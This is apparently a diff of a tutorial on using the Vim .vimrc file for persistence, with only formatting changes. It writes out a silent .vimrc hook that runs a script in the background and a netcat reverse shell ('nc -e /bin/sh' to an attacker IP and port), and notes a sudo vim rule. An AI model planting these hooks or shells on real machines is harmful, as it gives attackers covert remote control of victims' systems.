@@ -3,7 +3,7 @@
 
 The VIM editor needs no introduction; it is a well-known and widely used command-line text editor that comes pre-installed on most Unix and Linux operating systems. In many Linux setups, user-specific VIM configuration settings are stored in the user's home directory within the .vimrc file. This file accepts VIM-specific scripting commands, facilitating users to personalize Vim's functionalities according to their preferences. It is automatically loaded when Vim starts, enabling users to tailor their editing environment to their liking.
 
-This interesting setup presents an opportunity. By manipulating the .vimrc file, one can execute unintended actions during a user's VIM session, especially if VIM operates within an unrestricted environment.
+This interesting setup presents an opportunity. By manipulating the `.vimrc` file, one can execute unintended actions during a user's VIM session, especially if VIM operates within an unrestricted environment.
 
 To get a feel for that, let's experiment within the VIM environment. Execute the following command within VIM to get the user ID (or username):
 ```sh
@@ -22,19 +22,19 @@ Moreover, we can inject any commands into the .vimrc file, ensuring their execut
 
 Let's illustrate this with an example scenario: suppose an attacker, operating from a Kali Linux machine, gains access to a victim machine running Ubuntu. The attacker aims to establish a backdoor on the victim machine, such as creating a netcat reverse shell connection to the attacker's machine.
 
-First, on the victim machine, the attacker creates or modifies the .vimrc file by appending the following line:
+First, on the victim machine, the attacker creates or modifies the `.vimrc` file by appending the following line:
 ```sh
 echo ':silent !source /home/msbit/Labs/vimHacking/ncReverseSh.sh &' >> ~/.vimrc
 ```
-Let's analyze this command: Firstly, the `:silent` suppresses any debug output that would typically be displayed to the user when Vim runs. Then, the `source` command, preceded by an exclamation mark to indicate that this is a shell command, loads and executes the script ncReverseSh.sh, followed by the & to execute the command in the background."
+Let's analyze this command: Firstly, the `:silent` suppresses any debug output that would typically be displayed to the user when Vim runs. Then, the `source` command, preceded by an exclamation mark to indicate that this is a shell command, loads and executes the script ncReverseSh.sh, followed by the `&` to execute the command in the background."
 
-Now, the attacker need to populate the script ncReverseSh.sh with the payload:
+Now, the attacker need to populate the script `ncReverseSh.sh` with the payload:
 ```sh
 #!/bin/bash
 nc -e /bin/sh 192.168.171.1 7777 &
 ```
 
-This is a simple script that invokes the nc command with the -e switch, specifying the program (/bin/sh) to execute upon connection establishment, followed by the attacker's IP and listening port. Again, the & ensures the command runs in the background
+This is a simple script that invokes the nc command with the `-e` switch, specifying the program (`/bin/sh`) to execute upon connection establishment, followed by the attacker's IP and listening port. Again, the & ensures the command runs in the background
 
 Okay, let's give it a shot. Start a netcat listener on the attacker machine on port 7777:
 ```sh
@@ -53,7 +53,7 @@ sudo -l
 (root) NOPASSWD: /usr/bin/vim /opt/whatever.conf
 ```
 
-In this example, the configuration allows the root user to execute /usr/bin/vim on /opt/whatever.conf without requiring a password.
+In this example, the configuration allows the root user to execute `/usr/bin/vim` on `/opt/whatever.conf` without requiring a password.
 
 In conclusion, we have seen how an attacker can exploit a legitimate program to achieve malicious goals.
 
